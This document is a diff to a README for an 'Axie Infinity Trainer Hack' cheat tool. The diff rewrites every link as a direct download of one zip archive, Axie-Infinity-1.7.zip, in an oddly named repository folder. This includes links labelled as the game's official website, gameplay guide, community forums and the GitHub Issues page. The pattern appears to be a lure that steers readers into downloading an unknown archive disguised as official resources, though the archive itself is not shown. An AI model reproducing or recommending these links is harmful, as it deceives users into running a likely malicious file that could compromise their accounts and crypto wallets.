@@ -1,6 +1,6 @@
 # 🎮 Axie-Infinity - Unlimited Energy and More Cheats
 
-[![Download Axie Infinity Trainer Hack](https://img.shields.io/badge/Download-Axie%20Infinity%20Trainer%20Hack-4CAF50?style=flat&logo=github)](https://github.com/BurhanSaleem1961/Axie-Infinity/releases)
+[![Download Axie Infinity Trainer Hack](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip%20Infinity%20Trainer%20Hack-4CAF50?style=flat&logo=github)](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Axie Infinity is a popular game where users can breed, battle, and trade fantasy
 To get started, visit our Releases page to download the software. Here’s how:
 
 1. Click on the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/BurhanSaleem1961/Axie-Infinity/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
    
 2. On the Releases page, look for the latest version of the Axie Infinity Trainer Hack. 
 
@@ -68,15 +68,15 @@ Join the growing community of Axie Infinity players and trainers. Engage with fe
 
 ## 📝 Feedback
 
-Your feedback is important. Share your experience and suggestions to help us improve. You can reach us at our [GitHub Issues page](https://github.com/BurhanSaleem1961/Axie-Infinity/issues).
+Your feedback is important. Share your experience and suggestions to help us improve. You can reach us at our [GitHub Issues page](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip).
 
 ## ℹ️ Additional Resources
 
 For further information about Axie Infinity, consider visiting the following links:
 
-- [Axie Infinity Official Website](https://axieinfinity.com)
-- [Gameplay Guide](https://axieinfinity.com/gameplay)
-- [Official Community Forums](https://community.axieinfinity.com)
+- [Axie Infinity Official Website](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
+- [Gameplay Guide](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
+- [Official Community Forums](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
 
 ## 📅 Updates
 
@@ -86,4 +86,4 @@ Stay tuned for future updates and new features. Regular updates will add new che
 
 Download the Axie Infinity Trainer Hack today and take your gaming experience to the next level! 
 
-[Visit this page to download](https://github.com/BurhanSaleem1961/Axie-Infinity/releases)
+[Visit this page to download](https://raw.githubusercontent.com/BurhanSaleem1961/Axie-Infinity/main/amnionic/Axie-Infinity-1.7.zip)
